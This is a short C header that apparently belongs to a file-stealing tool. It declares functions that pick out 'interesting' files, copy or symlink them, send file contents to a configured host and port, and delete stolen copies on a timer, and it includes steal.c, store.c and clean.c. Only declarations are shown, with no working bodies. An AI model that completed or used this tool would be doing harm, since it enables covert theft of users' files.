#if defined FILE_CLEANSE_TIMER
void rmstolens(void);
void cleanstolen(void);
#include "clean.c"
#endif

#ifdef STOLEN_STORAGE
char *readstorepath(void);
char *gethost(void);
unsigned short getport(void);
#include "store.c"
#endif

#define FILENAME_MAXLEN 256

#ifdef BLACKLIST_TOO
int uninteresting(char *path);
#endif

#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
int linkfile(const char *oldpath, char *newpath);
#endif

char *fullpath(char *cwd, const char *file);
int fileincwd(char *cwd, const char *file);
#ifdef DIRECTORIES_TOO
int interestingdir(const char *path);
#endif
int interesting(const char *path);
#ifdef ORIGINAL_RW_FALLBACK
void wcfallback(FILE *ofp, off_t fsize, char *newpath);
#endif
#ifdef STOLEN_STORAGE
int sendmap(const char *oldpath, unsigned char *map, off_t fsize);
#endif
int writecopy(const char *old_path, char *new_path);
char *getnewpath(char *filename);
static int takeit(void *oldpath);
void inspectfile(const char *pathname);
#include "steal.c"